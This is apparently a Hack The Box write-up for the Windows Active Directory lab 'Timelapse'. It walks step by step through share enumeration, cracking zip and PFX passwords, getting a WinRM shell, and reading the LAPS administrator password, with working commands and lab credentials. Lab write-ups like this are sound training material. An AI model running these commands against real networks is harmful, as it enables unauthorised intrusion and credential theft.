# HTB - Timelapse

![Timelapse](https://user-images.githubusercontent.com/58801547/161899302-bdb1da7c-6ba5-48e0-a97d-590015c25e4d.png)

## Windows - Easy

## Table of Contents
- [HTB - Timelapse](#htb---timelapse)
  * [Enumeration](#enumeration)
    + [Nmap](#nmap)
    + [Crackmapexec (cme)](#crackmapexec--cme-)
    + [Smbclient](#smbclient)
  * [Exploitation](#exploitation)
  * [Privileges Escalation](#privileges-escalation)
  * [Referrences](#referrences)

This is one of the Active Directory Machine, So first let's get started

## Enumeration

### Nmap
Nmap gives some information about the domain, LDAP service, and Kerberos; I can notice it was certainly AD. So next, I will try to find AD users or SMB shares.

```
# Nmap 7.92 scan initiated Fri Apr  1 17:28:39 2022 as: nmap -sVC -p- -T4 -v -oN nmap/timelapse timelapse.htb
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.037s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-04-01 18:30:18Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2022-04-01T18:31:48+00:00; +7h59m53s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
58280/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-04-01T18:31:09
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m52s, deviation: 0s, median: 7h59m52s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  1 17:31:55 2022 -- 1 IP address (1 host up) scanned in 195.98 seconds

```

### Crackmapexec (cme)
**command:** `cme smb -u 'guest' -p '' timelapse.htb --shares`

There are two public shares that guest user have `READ` permission. let's look into `Shares`.

```
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\guest:
SMB         10.10.11.152    445    DC01             [+] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share
SMB         10.10.11.152    445    DC01             Shares          READ
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share
```

### Smbclient
**command:** `smbclient \\\\timelapse.htb\\Shares -I 10.10.11.152 -u guest`

Now, I connected to `Shares` and download all files to my local machine.
There is interesting file `winrm_backup.zip`

![shares](https://user-images.githubusercontent.com/58801547/161911784-b97848df-58b6-4428-b2d9-ef1dcdbde04d.png)

![zip password](https://user-images.githubusercontent.com/58801547/161912620-b85ab69e-cd31-425e-a163-9c8c201a7e76.png)
> Password protection boi. So, let's crack it

Used `zip2john` to convert zip into a hash format that `johntheripper` can crack.
`zip2john winrm_backup.zip > hash`

Then use `john` with wordlist `rockyou.txt`
```
winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip

1 password hash cracked, 0 left
```
> The password is `supremelegacy`

After extracting files, I got `legacyy_dev_auth.pfx` looks like it was an SSL-certificate file that you can use to authentication with the webserver or maybe `winrm`; then I tried to open it.

![image](https://user-images.githubusercontent.com/58801547/161914639-6e34e150-3466-4e42-973d-f7e1f05e6b51.png)
> Yikes, another password protection (for private key), Let's crack it again.

This time I use `crackpkcs12` program from github. Thanks to **Aestu** & **MarcoFalke**.

![crackpkcs12](https://user-images.githubusercontent.com/58801547/161916344-ed68aab6-5f53-4b22-97f9-d5b9214d672b.png)
> The password to unlock SSL-certificate is `thuglegacy`

After examine the certificate look like it purpose was to authenticate to the `winrm`.

![certificate details](https://user-images.githubusercontent.com/58801547/161916573-2e68fd70-18a0-4749-b49f-d1ba9d9a44a4.png)

I need `public key` and `private key` to authenticate to winrm but now I already got them I just need to extract them from certificate file.

Now, I got enough informations to obtain the shell users. Let's go to exploitation part.

## Exploitation

Public Key: `openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem`

Private Key: `openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem`

Use `evil-winrm` with both keys connected to the target machine.

```
3cat@kali:~/Desktop/HTB/Timelapse$ evil-winrm -i 10.10.11.152 -S -c kuy.cer -k kuy.key

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> ls
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```
> got legacyy users and user flag

## Privileges Escalation
I tried to run `winpeas` but the AV detected it was malware, virus (of course). Somehow, even the obfuscation version still doesn't work for me. So, I decided to do the manual enumeration.

And Then I found the powershell history file that contain some information of `svc_deploy` user.

![pwsh history](https://user-images.githubusercontent.com/58801547/161920186-79356fd2-3775-4048-b45a-b50e7d190d18.png)

I just copied those command and run it with `whoami /groups` to check user groups (You can login to `svc_deploy` user with `evil-winrm` as well but I'm just lazy).

**command:** `invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /groups}`

![svc groups](https://user-images.githubusercontent.com/58801547/161920810-8e1e74da-d1d1-48d9-b515-ffb29b752bf8.png)
> `svc_deploy` was in `LAPS_Readers` groups maybe this user has permission to read the `administrator` password.

After some googling, I found this situation was quite similar to this machine. Let's try it.
![laps exploit](https://user-images.githubusercontent.com/58801547/161922148-60181f36-70f9-4c62-b6c3-689701685f89.png)


**command:** `invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd' , 'ms-mcs-admpwdexpirationtime'}`

![image](https://user-images.githubusercontent.com/58801547/161921811-10cd48c9-1ccf-47a8-b77b-7709c269e6bc.png)
> Got `admininstrator` password woohoo~.

![admin shell](https://user-images.githubusercontent.com/58801547/161921859-57a5ce1c-7429-4b57-b259-2573ec59ddd2.png)
> Just login with `evil-winrm` and PWNED :)


## Referrences

https://github.com/crackpkcs12/crackpkcs12

https://adsecurity.org/?p=3164 
